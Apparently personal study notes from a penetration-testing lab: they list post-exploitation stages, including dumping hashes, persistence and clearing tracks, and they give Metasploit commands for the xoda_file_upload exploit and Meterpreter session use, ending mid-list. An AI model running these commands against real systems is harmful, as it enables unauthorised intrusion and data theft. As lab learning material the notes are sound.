* Post-exploitation includes:
  1. Local Enumeration
  2. Privilege escalation
  3. Dumping hashes
  4. Establishing persistence --> If the system is changed or shut down, we have the ability to go through the whole exploitation process again.
  5. Clearing our tracks
  6. Pivoting
 
## What is Meterpreter
* Meterpreter or Meta-Interpreter payload is an advanced multi-functional payload that operates via DLL injection
* It is executed in memory on the target system making it harder to detect.
* It communicates over a stager socket.

* PRACTICAL
* Repeat steps until db_nmap
* `use exploit/unix/webapp/xoda_file_upload`
* `set targteuri /` --> To the root
* `run`
* ***
* `help` --> To list all the commands that can be used inb a meterpreter session.
* `background` --> Put the current meterpreter session to background
* `exit` -> Exit the current session.
* `sessions -h`
* `sessions -C [command to be executed like sysinfo] -i [id]`
* ***
* `download [fileName]` --> `download flag.zip`
* Exit the meterpreter session
* `unzip flag.zip`
* `cat [extracted file]`
* `checksum md5 /bin/bash` --> Lookout how this command works???
* ***
* `getenv PATH`
* **Search for files**
* `search -d /usr/bin -f *backdoor *`
* `search -f *.exe`
* ***
* **Process command**
  * `ps`
  * `
